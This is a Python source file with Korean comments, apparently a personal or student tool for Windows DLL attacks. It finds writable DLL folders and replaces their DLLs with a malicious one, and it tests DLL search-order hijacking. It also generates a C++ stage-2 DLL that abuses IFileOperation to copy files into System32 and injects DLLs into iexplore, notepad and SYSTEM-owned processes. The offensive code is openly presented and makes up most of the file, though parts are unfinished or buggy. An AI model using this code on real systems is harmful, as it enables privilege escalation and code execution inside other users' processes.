import os
from pyinjector import inject
import subprocess
import psutil
import shutil
from pywinauto import Application
import time
class hiJacking():
    def hiJacking(self):
        pass
    #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
    def list_dll(self,pid):
        stream = os.popen("Listdlls.exe " + str(pid))
        dlls = stream.read()
        program_name = ""
        list_dlls = []
        list_programs = []
        path_lists = []
        # try:
        #     program_name = dlls.split("\n")[7]
        #     program_name = program_name.replace("Command line: ", '').replace('"', '').replace(' -bystartup','').replace('\\','/')
        #     if not program_name.endswith('.exe'):
        #         raise Exception("not exe File")
        # except:
        #     print("Wrong pid...")
        
        
        # if 'C:/' not in program_name:
        #     name_split = program_name.split('/')
        #     name = name_split[-1]
        #     for dirpath, dirname, filename in tqdm(os.walk("C:/")):
        #         if name in filename:
        #             program_name =  os.path.join(dirpath, name)

        # split_text = dlls.replace("\\","/").replace(' ', '\n').split('\n')
        try:
            split_text = dlls.replace("\\","/").replace('  ','\n').split('\n')
            
       
            for i in split_text:
                path_lists.append(i.replace(" ",""))
            
            for i in path_lists:
                if i.endswith(".exe"):
                    list_programs.append(i)
                if i.endswith(".dll"):
                    list_dlls.append(i)   
            program_name = list_programs[0]
        except:
            print("Wrong pid...")
        return program_name, list_dlls
        
        #dll이 저장되어 있는 폴더의 일반 유저 또한 쓰기 권한이 있는지 검증
    def check_permission(self,path):
        user_perm_dir = []
        user_perm_file = []
        for i in path:
            dir_path = os.path.dirname(i)
            try:
                open(dir_path+"/test.txt","w")
                os.remove(dir_path+"/test.txt")
                name_split = i.split('/')
                name = name_split[-1]
                user_perm_file.append(name)
                user_perm_dir.append(i)
                # if os.access(dir_path,os.W_OK):
                #     name_split = i.split('/')
                #     name = name_split[-1]
                #     user_perm_file.append(name)
                #     user_perm_dir.append(i)
            except:
                pass
        return user_perm_file,user_perm_dir
    #strings 명령어를 이용하여 dll을 하드코딩으로 로드하는지 확인
    def find_string(self,name,list_name,list_dir):
        stream = os.popen("strings " + name)
        strings = stream.read()
        strings = strings.replace("\\",'/').split("\n")
        string_dll = []
        for i in strings:
            if i.endswith(".dll"):
                string_dll.append(i)
        for string in string_dll:
            if  string in list_name:
                return True
            elif string in list_dir:
                return True
            else:
                return False
    #exe파일을 직접 실행하여 pid를 가져옴
    def create_process(self,path):
    
        try:
          pid = subprocess.Popen([path]).pid
        except:
            print("Wrong EXE Path!")
            exit(0)
        return pid
        
    #악성 dll을 입력받은 경로로 바꿔줌
    def change_dll(self,dll_path,hijactable_dll_path):
        try:
            for i in hijactable_dll_path:
                os.remove(i)
                shutil.copy2(dll_path,i)
                
        except:
            print("Cannot remove or write DLL")
            
    def search_order_hijack(self,pid):
        program_name, list_dlls = self.list_dll(pid)
        program_path = os.path.dirname(program_name)
        changed_path = []
        search_order_path = []
        for i in list_dlls:
            name_split = i.split('/')
            name = name_split[-1]
            search_order_path.append(program_path + "/" + name)
            
        for i in range(len(list_dlls)):
            try:
                shutil.copy2(list_dlls[i],search_order_path[i])
                changed_path.append(search_order_path[i])
            except:
                print(list_dlls[i] + "  1순위 복사 에러")
        newPid = self.create_process(program_name)
        program_name, newList_dlls = self.list_dll(newPid)
        
        # successed_path = {}
        # for i in range(len(newList_dlls)):
        #     if newList_dlls[i] in changed_path:
        #         successed_path[list_dlls[i]] = newList_dlls[i]


        successed_path = {}

        for i in newList_dlls:
            if i in changed_path:
                name_split = i.split('/')
                name = name_split[-1]
                
                for j in list_dlls:
                    name2_split = j.split('/')
                    name2 = name2_split[-1]
                    if name == name2:
                        successed_path[i] = j


        psutil.Process(newPid).kill()
        #psutil.Process(pid).kill()
        
            
        for i in changed_path:
                try:
                    os.remove(i)
                except:
                    print(i + " : cannot remove file")
        
        return successed_path
        
    # 사전 검사를 통해 dll Hijacking에 취약한지 확인하여 공격을 함
    # 다만 이것이 일관성(모든 경우에 해당하는) 탐지 및 공격 방법인지는 검증 필요
    def normal_hijack(self):
        path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
        path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
        pid = self.create_process(path_exe)
        program_name, list_dlls = self.list_dll(pid)
        file_list,dir_list = self.check_permission(list_dlls)
        if not len(file_list) == 0:
            if self.find_string(program_name,file_list,dir_list):
                print("Detect programs vulnerable to dll injection")
                print("Vulnerable PID : " + str(pid))
                os.system('taskkill /f /pid '+str(pid))
                self.change_dll(path_dll,dir_list,pid)
            else:
                print("Nah....")
        else:
            print("Not Found writable dir")
            
    def abusing_IfileOperation(self,exe_path,dll_path="CreateDLL.dll"):
        dll_abspath = ""
        if(dll_path == "CreateDLL.dll"):
            dll_abspath = os.path.dirname(__file__) + "\\" + dll_path
        else:
            dll_abspath = dll_path        
        #1. 익스플로러 실행하기
        
        explore_pid = self.create_process("C:/Program Files/Internet Explorer/iexplore.exe")
        exe_pid = self.create_process(exe_path)
        # DLL 리스트 파싱 후 원활한 파일 이동을 위해 프로세스 종료
        program_name, list_dlls = self.list_dll(exe_pid)
        psutil.Process(exe_pid).kill()
        # #2. IFileOperation 코드에 원하는 인자를 세팅 후 빌드 하기
        
        dll_code = """int haxproc()
{
	//IMPORTANT: This is an unicode dll
	//Resolve %TEMP% path

	//Calls the COM interface to copy the stage 2 dll to the Windows path //C:\\Windows\\System32
	HRESULT test = CopyItem(L"{src_path}", L"{des_path}", L"{fileName}"); //Resolve the windows path it may not be in C:
	if (SUCCEEDED(test))
	{
		MessageBox(0, L"Stage-2 Installed", 0, 0);
	}


	return 0;
}""".format(src_path = "",des_path="",fileName="")
        
        with open("CreateIFileOperationDLL/dll.cpp",'w') as dllFile:
            dllFile.write(dll_code)
            dllFile.close()
        
        # #3. 수정 완료한 dll.cpp를 Cmake를 이용하여 빌드(종속성 에러 때문에 Cmake 설치 요구 표시)
        if(os.system("cmake")):
            os.system("cd CreateIFileOperationDLL && .\Build.bat")     
        else:
            os.system("cmake.msi")
            print("Cmake 설치 후 다시 기능을 실행해 주세요")
            return
        exploit_dll_path = "CreateIFileOperationDLL/Debug/exploitDll.dll"
        
        # 4. 원본 dll을 복사 hijacking 종료 후 다시 원상 복귀
        dll_tmp_path = "dll_tmp"
            
        shutil.copy2("원본 DLL 경로",dll_path)
        # 5. explore에 빌드한 dll 인젝션
        
        inject(explore_pid,exploit_dll_path)
        
        # 6. 불필요한 프로세스 종료 후 하이제킹한 DLL 이 로드 될 수 있도록 실행
        psutil.Process(explore_pid).kill()
        
        
        hijacked_pid = self.create_process(exe_path)
        
        # 7. 기본 악성 DLL을 사용시 messageBoxA가 띄워지므로 pywinauto를 이용하여 확인 버튼 클릭 정상 동작시 성공으로 간주
        
        app = Application(backend="win32").connect(hijacked_pid)
        try:
            dlg = app.window(title_re="SECU")
            dlg.확인.click()
            print("Hijacking Success!")
        except:
            print("Hijacking Fail..")
        # 8. 기본 악성 DLL에서 원래 DLL로 다시 복사(다시 IFileOperation을 이용)
        
class injection():
    def injection(self):
        pass
    #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
    def find_process(self):
        proc_lists = []
        try:
            # 실행중인 프로세스를 순차적으로 검색
            for proc in psutil.process_iter():
            # 프로세스 이름을 ps_name에 할당
                ps_name = proc.name()
                # 실행 명령어와 인자(argument)를 리스트 형식으로 가져와 cmdline에 할당
                cmdline = proc.cmdline()
                
                username = proc.username()
                if username.endswith('SYSTEM'):
                    proc_lists.append(proc.ppid())
                print('NAME:', ps_name, ' CMD:', cmdline, ' userName: ', username)
            return proc_lists
        except:
            pass
        
        
     
    #find_process에서 찾은 pid를 악성 dll을 이용하여 인젝션 해보기
    def attack(self,pid,path_dll):
        inject(pid,path_dll)


if __name__=='__main__': 
    dll_inject = injection()
    dll_hijact = hiJacking()
    # path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
    # path_dll = "CreateIFileOperationDLL\Debug\PROJECT_NAME.dll"
    # pid = dll_hijact.create_process(path_exe)
    # inject(pid,path_dll)
    #dll_hijact.abusing_IfileOperation(1234)
    #pid = dll_hijact.create_process("C:/Users/CodeByO/Desktop/test/crackme1.exe")
    # success = dll_hijact.search_order_hijack(20588)    
    # for i,j in success.items():
    #     print(i,j)
    # os.system("cd CreateIFileOperationDLL && .\Build.bat")
    # time.sleep(2)
    explore_pid = dll_hijact.create_process("C:/Windows/System32/notepad.exe")
    
    inject(explore_pid,"CreateIFileOperationDLL/Debug/exploitDll.dll") 
    psutil.Process(explore_pid).kill()   
    # os.remove("CreateIFileOperationDLL\CMakeCache.txt")
    # shutil.rmtree("CreateIFileOperationDLL\CMakeFiles")
# 종속성 에러 방지를 위해 setup.py 작성 필요


